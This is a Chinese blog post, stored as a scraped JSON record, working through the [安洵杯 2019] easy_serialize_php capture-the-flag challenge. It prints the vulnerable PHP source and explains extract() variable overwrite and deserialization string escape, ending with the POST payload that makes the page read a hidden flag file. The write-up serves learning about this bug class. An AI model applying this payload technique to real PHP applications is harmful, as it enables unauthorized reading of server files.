{"blogid": "124291588", "writerAge": "码龄2年", "writerBlogNum": "13", "writerCollect": "6", "writerComment": "4", "writerFan": "11", "writerGrade": "2级", "writerIntegral": "166", "writerName": "v2ish1yan", "writerProfileAdress": "..\\..\\static\\writer_image\\profile_124291588.jpg", "writerRankTotal": "70212", "writerRankWeekly": "278563", "writerThumb": "31", "writerVisitNum": "6757", "blog_read_count": "1012", "blog_time": "已于 2022-04-20 17:03:32 修改", "blog_title": "[安洵杯 2019]easy_serialize_php（有思考过程）", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"../../static/bootstrap/css/csdnstyle.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p>我是大菜鸡！</p>\n<p>今天自己做的一道题，纪念一下。</p>\n<p>（转自我的博客：<a href=\"https://www.cnblogs.com/v2ish1yan/articles/16118319.html\" title=\"[安洵杯 2019]easy_serialize_php - v2ish1yan - 博客园\">[安洵杯 2019]easy_serialize_php - v2ish1yan - 博客园</a>）</p>\n<p><strong>知识点：</strong></p>\n<p><strong>1.用的刚好是我前面文章里面写的反序列化字符串逃逸。</strong></p>\n<p><strong>2.extract()变量覆盖</strong></p>\n<p>首先看题代码。</p>\n<pre><code class=\"language-php\">&lt;?php\n\n$function = @$_GET['f'];\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function){\n    echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}</code></pre>\n<p>从代码里面看可能的切入点。</p>\n<pre><code class=\"language-php\">&lt;?php\n\n$function = @$_GET['f'];//懂的都懂\n\nfunction filter($img){//是一个过滤器，把符合filter_arr里面的字符替换为空（满足字符串逃逸的条件）\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\nif($_SESSION){\n    unset($_SESSION);//把$_SESSION重置为空\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);//这里就用了变量覆盖的知识\n\nif(!$function){\n    echo '&lt;a href=\"index.php?f=highlight_file\"&gt;source_code&lt;/a&gt;';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n$serialize_info = filter(serialize($_SESSION));//把序列化后的$_SESSION用filter函数过滤\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){//ta没骗人，确实能找到一些东西\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));//这里只进行了一次base64解码。\n}</code></pre>\n<p>首先我们要知道$_SESSION是什么：https://blog.csdn.net/masterft/article/details/1640122</p>\n<p>单从做这个题来说，$_SESSION是访客与整个网站交互过程中一直存在的公有变量。</p>\n<p>然后看extract()函数的功能：</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\64f7ebe05fc94644656a4b0f4889b318.png\"/></p>\n<p></p>\n<p></p>\n<p> extract($_POST)就是将post的内容作为这个函数的参数。</p>\n<p>然后就是变量覆盖。<strong>如果post传参为_SESSION[flag]=123，那么$_SESSION[\"user\"]和$_SESSION[\"function\"]的值都会被覆盖</strong>。</p>\n<p>至于为什么post要传_SESSION[flag]=123而不是$_SESSION[flag]=123，是因为_SESSION是变量名，如果传$_SESSION，那么就会失效。</p>\n<p>本地测试：</p>\n<pre><code class=\"language-php\">&lt;?php\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] ='123';\necho '覆盖前：';\nvar_dump($_SESSION);\necho \"&lt;br&gt;\";\nextract($_POST);\necho '覆盖后：';\nvar_dump($_SESSION);</code></pre>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\01e385266aa64951f669d6f35ac59356.png\"/></p>\n<p>一步步来：先?f=phpinfo看看能找到什么东西。</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\664b775468bacff1a758b7da384a8c01.png\"/></p>\n<p> 找到了一个php文件，意思是页面底部加载文件，即require()。</p>\n<p>所以就有可能要通过最后一个语句来打开查看这个文件。</p>\n<pre><code class=\"language-php\">else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}</code></pre>\n<p>而那个文件名以base64编码后的字符串存在userinfo['img']里面，而$userinfo = unserialize($serialize_info)</p>\n<p>又$serialize_info= filter(serialize($_SESSION))。</p>\n<p>而且在提取文件时，只对文件进行了一次base64解码，所以对应代码里的</p>\n<pre><code class=\"language-php\">if(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));</code></pre>\n<p>只能让img_path为空，并把guest_img.png逃逸出去。</p>\n<p>先本地测试，看看序列化后的字符串是什么样的:</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\b2b4b058aa84f5a74d5554448e5f9590.png\"/></p>\n<p> 然后再进行变量覆盖</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\295cf4389eb7e070946894e2f68f480b.png\"/></p>\n<p></p>\n<p></p>\n<p> 因为我们要让img的内容为d0g3_f1ag.phpbase64编码后的字符串，所以要传_SESSION[img]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}</p>\n<p>但我们得到的是</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\4a43d8b7ed6d76ea3753b91a67e8c964.png\"/></p>\n<p> 因为在变量覆盖后面，又重新给$_SESSION[img]赋值了，所以这个时候就要使用filter函数了，</p>\n<p>如果我们传的是_SESSION[imgphp]=;s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}</p>\n<p>那么得到的是</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\0ccbd20edfece50b60046a6a39234d48.png\"/></p>\n<p> 这里就可以看出来一点字符串逃逸的感觉了。</p>\n<p>我最开始的想法是让s:6读取黄字部分</p>\n<p>a:2:{s:6:\"<span style=\"background-color:#ffd900;\">img\";s:39:</span>\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\"</p>\n<p>这样不就可以让后面的s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"生效了吗？</p>\n<p>我们试试构造一下</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\b15661fba23d98d3d277c20c0229812e.png\"/></p>\n<p></p>\n<p> a:2:{s:10:\"img\";s:40:\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}这样看刚刚好，但是真的能成功吗？</p>\n<p>我们进行反序列化看看。</p>\n<pre><code class=\"language-php\">&lt;?php\n$a=unserialize('a:2:{s:10:\"img\";s:40:\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}');\nprint_r($a);</code></pre>\n<p>得到的结果</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\aec7b2bd11c6530ac965e25f6eb59dd6.png\"/></p>\n<p></p>\n<p>不行！</p>\n<p>后来发现，看前面的a:2那里，如果我们这样构造的话，序列化内容就不满足a:2了。（即有两个元素）</p>\n<p>这个好解决，加一个不就行了吗，前面加上s:3:\"123\"来构造。</p>\n<p>_SESSION[imgphpflag]=;s:3:\"123\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}</p>\n<p>得到：</p>\n<p>a:2:{s:10:\"img\";s:50:\";s:3:\"123\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}</p>\n<p>再反序列化看看</p>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\fbf7a88822ba1708279980fb3928dcce.png\"/></p>\n<p></p>\n<p>成了！</p>\n<p><strong>payload：(post传参）</strong></p>\n<pre><code class=\"language-php\">;s:3:\"123\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}</code></pre>\n<p class=\"img-center\"><img alt=\"\" src=\"..\\..\\static\\image\\1cab70e61674900645bc943ce5b9870a.png\"/></p>\n<p></p>\n<p> 后面的就简单了。</p>\n<p></p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 0, "javascript": 0, "java": 0, "sql": 0, "php": 1, "time": "2022-04-20 17:03:32", "summary": "我是大菜鸡！今天自己做的一道题，纪念一下。转自我的博客：安洵杯博客园安洵杯博客园知识点：用的刚好是我前面文章里面写的反序列化字符串逃逸。变量覆盖首先看题代码。从代码里面看可能的切入点。懂的都懂是一个过"}